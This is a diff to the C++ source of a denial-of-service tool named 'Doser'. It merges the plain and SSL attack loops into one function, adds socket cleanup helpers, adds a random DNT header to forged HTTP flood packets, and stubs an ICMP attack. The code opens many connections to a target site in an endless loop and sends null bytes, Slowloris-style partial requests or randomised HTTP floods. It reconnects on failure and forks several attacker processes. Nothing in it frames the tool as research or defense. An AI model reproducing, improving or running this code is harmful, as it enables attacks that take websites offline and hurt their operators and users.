@@ -14,62 +14,17 @@ void Doser::attack(const int *id){
     int x, r;
     std::vector<int> sockets;
     std::vector<bool> packets;
-    for (x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
-        packets.push_back(false);
-    }
-    signal(SIGPIPE, &Doser::broke);
-    while(true) {
-        static std::string message;
-        for (x = 0; x < conf->CONNECTIONS; x++) {
-            if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                packets[x] = false;
-            }
-            if(conf->vector == config::NullTCP | conf->vector == config::NullUDP){
-                r = write_socket(sockets[x], "\0", 1);
-            }else{
-                std::string packet = craft_packet(packets[x]);
-                r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()));
-                packets[x] = true;
-            }
-            if(conf->GetResponse){
-                read_socket(sockets[x]);
-            }
-            if(r == -1){
-                close(sockets[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                packets[x] = false;
-            }else{
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
-            }
-        }
-        message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
-        if(conf->vector == config::Slowloris){
-            usleep(10000000);
-        }else{
-            usleep(30000);
-        }
-
-    }
-}
-
-void Doser::attack_ssl(const int *id){
-    int x, r;
-    std::vector<int> sockets;
-    std::vector<bool> packets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
+    if(conf->UseSSL){
+        for (x = 0; x < conf->CONNECTIONS; x++) {
+            SSLs.push_back(nullptr);
+            CTXs.push_back(nullptr);
+        }
+    }
     for (x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
         packets.push_back(false);
-        SSLs.push_back(nullptr);
-        CTXs.push_back(nullptr);
     }
     signal(SIGPIPE, &Doser::broke);
     while(true) {
@@ -77,27 +32,45 @@ void Doser::attack_ssl(const int *id){
         for (x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                CTXs[x] = InitCTX();
-                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                if(conf->UseSSL){
+                    CTXs[x] = InitCTX();
+                    SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                }
                 packets[x] = false;
             }
             if(conf->vector == config::NullTCP | conf->vector == config::NullUDP){
-                r = write_socket(SSLs[x], "\0", 1);
+                if(conf->UseSSL){
+                    r = write_socket(SSLs[x], "\0", 1);
+                }else{
+                    r = write_socket(sockets[x], "\0", 1);
+                }
             }else{
                 std::string packet = craft_packet(packets[x]);
-                r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()));
+                if(conf->UseSSL){
+                    r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()));
+                }else{
+                    r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()));
+                }
                 packets[x] = true;
             }
             if(conf->GetResponse){
-                read_socket(SSLs[x]);
+                if(conf->UseSSL){
+                    read_socket(SSLs[x]);
+                }else{
+                    read_socket(sockets[x]);
+                }
             }
             if(r == -1){
-                SSL_free(SSLs[x]);
-                close(sockets[x]);
-                SSL_CTX_free(CTXs[x]);
+                if(conf->UseSSL){
+                    cleanup(SSLs[x], &sockets[x], CTXs[x]);
+                }else{
+                    cleanup(&sockets[x]);
+                }
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                CTXs[x] = InitCTX();
-                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                if(conf->UseSSL){
+                    CTXs[x] = InitCTX();
+                    SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                }
                 packets[x] = false;
             }else{
                 message = std::string("Socket[") + std::to_string(x) + "->"
@@ -114,9 +87,9 @@ void Doser::attack_ssl(const int *id){
         }else{
             usleep(30000);
         }
+
     }
 }
-
 int Doser::make_socket(const char *host, const char *port) {
     struct addrinfo hints{}, *servinfo, *p;
     int sock = 0, r;
@@ -219,11 +192,7 @@ void Doser::run() {
         switch (fork()){
             case 0:break;
             default:
-                if(conf->UseSSL){
-                    attack_ssl(&x);
-                }else{
-                    attack(&x);
-                }
+                attack(&x);
         }
         usleep(200000);
     }
@@ -292,6 +261,7 @@ std::string Doser::craft_packet(bool keep_alive){
                       + " \r\nContent-Type: " + contenttype[0]
                       + " \r\nCookie: " + createStr() + "=" + createStr()
                       + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
+                      + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                       + "\r\n\r\n";
             return packet;
         }
@@ -318,6 +288,7 @@ std::string Doser::craft_packet(bool keep_alive){
                           + " \r\nContent-Type: " + contenttype[0]
                           + " \r\nCookie: " + createStr() + "=" + createStr()
                           + " \r\nAccept: */*"
+                          + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                           + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                           + " \r\n";
             }
@@ -356,4 +327,18 @@ SSL *Doser::Apply_SSL(int socket, SSL_CTX *ctx){
         exit(EXIT_FAILURE);
     }
     return ssl;
+}
+
+void Doser::cleanup(const int *socket) {
+    close(*socket);
+}
+
+void Doser::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
+    SSL_free(ssl);
+    close(*socket);
+    SSL_CTX_free(ctx);
+}
+
+void Doser::attack_icmp(const int *id) {
+
 }
